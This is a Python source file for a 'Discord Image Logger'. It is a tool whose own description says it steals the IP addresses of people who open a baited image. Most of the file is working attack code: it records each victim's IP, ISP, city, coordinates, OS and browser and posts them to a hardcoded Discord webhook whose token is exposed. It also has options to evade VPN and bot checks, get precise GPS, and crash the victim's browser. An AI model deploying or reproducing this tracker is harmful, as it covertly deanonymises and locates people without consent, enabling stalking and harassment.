# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq",
    "image": "data:image/png;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
